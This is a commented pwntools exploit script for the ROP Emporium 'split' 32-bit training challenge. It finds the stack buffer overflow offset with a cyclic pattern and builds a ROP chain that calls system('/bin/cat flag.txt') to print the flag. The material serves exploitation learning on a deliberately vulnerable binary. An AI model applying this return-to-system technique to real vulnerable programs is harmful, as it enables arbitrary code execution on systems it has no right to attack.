from pwn import *

# Load binary into pwntools
elf = context.binary = ELF('split32')

# Enable verbose logging
context.log_level = 'debug'

# Let's take a look at the binary

# (venv3) hjgk@ophit:~/dokumente/programmierung/hack/ropemporium/02_split$ rabin2 -z split32
# [Strings]
# nth paddr      vaddr      len size section type  string
# ―――――――――――――――――――――――――――――――――――――――――――――――――――――――
# 0   0x000006b0 0x080486b0 21  22   .rodata ascii split by ROP Emporium
# 1   0x000006c6 0x080486c6 4   5    .rodata ascii x86\n
# 2   0x000006cb 0x080486cb 8   9    .rodata ascii \nExiting
# 3   0x000006d4 0x080486d4 43  44   .rodata ascii Contriving a reason to ask user for data...
# 4   0x00000703 0x08048703 10  11   .rodata ascii Thank you!
# 5   0x0000070e 0x0804870e 7   8    .rodata ascii /bin/ls
# 0   0x00001030 0x0804a030 17  18   .data   ascii /bin/cat flag.txt


# [0x08048430]> s sym.usefulFunction
# [0x0804860c]> pdf
# ┌ 25: sym.usefulFunction ();
# │           0x0804860c      55             push ebp
# │           0x0804860d      89e5           mov ebp, esp
# │           0x0804860f      83ec08         sub esp, 8
# │           0x08048612      83ec0c         sub esp, 0xc
# │           0x08048615      680e870408     push str._bin_ls            ; 0x804870e ; "/bin/ls" ; const char *string
# │           0x0804861a      e8c1fdffff     call sym.imp.system         ; int system(const char *string)
# │           0x0804861f      83c410         add esp, 0x10
# │           0x08048622      90             nop
# │           0x08048623      c9             leave
# └           0x08048624      c3             ret


# I want to execute sym.imp.system in sym.usefulFunction, but with a
# reference to /bin/cat flag.txt instead of bin/ls.
# Thus, I prepare a fake stack with a reference to "/bin/cat flag.txt" and
# a reference to sym.imp.system.

# Figure out length of buffer
io = process(elf.path)

# We will send a 'cyclic' (de Bruijn) pattern which overwrites the return
# address on the stack.  The value 128 is longer than the buffer.
io.sendline(cyclic(128))

# Wait for the process to crash
# if this does not work, check /proc/sys/kernel/core_pattern
# e.g. echo "/tmp/core.%e.%p.%h.%t" > /proc/sys/kernel/core_pattern
# or simply echo "/tmp/core" > /proc/sys/kernel/core_pattern
io.wait()

# Open up the corefile
core = io.corefile

# Print out the address of ESP at the time of crashing
stack = core.esp
info("%#x stack", stack)

# Read EIP, which will be some of our cyclic data.
#
# With this snippet of the pattern, we know the exact offset from
# the beginning of our controlled data to the return address.
pattern = core.eip
info("%r pattern", pattern)

#print length of the buffer
info("%s bufferlen", cyclic_find(core.eip))


# I want system(/bin/cat flag.txt), so I need to get the correct
# references

# Print system address
system = elf.symbols.system
info("%#x system", system)

# Print reference to "/bin/cat flag.txt"
cat = next(elf.search(b'/bin/cat flag.txt'))
info("%#x reference to /bin/cat flag.txt", cat)

# We need to set up the stack. pwnlib knows what to do.
rop = ROP(elf)
rop.system(cat)

info(rop.dump())

# Craft a new payload which puts our fake stack at the correct offset
payload = flat({
    pattern: rop.chain()
})


# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.wait()

io.recvuntil("Thank you!\n")

# Get our flag!
flag = io.recvline()
print(flag)
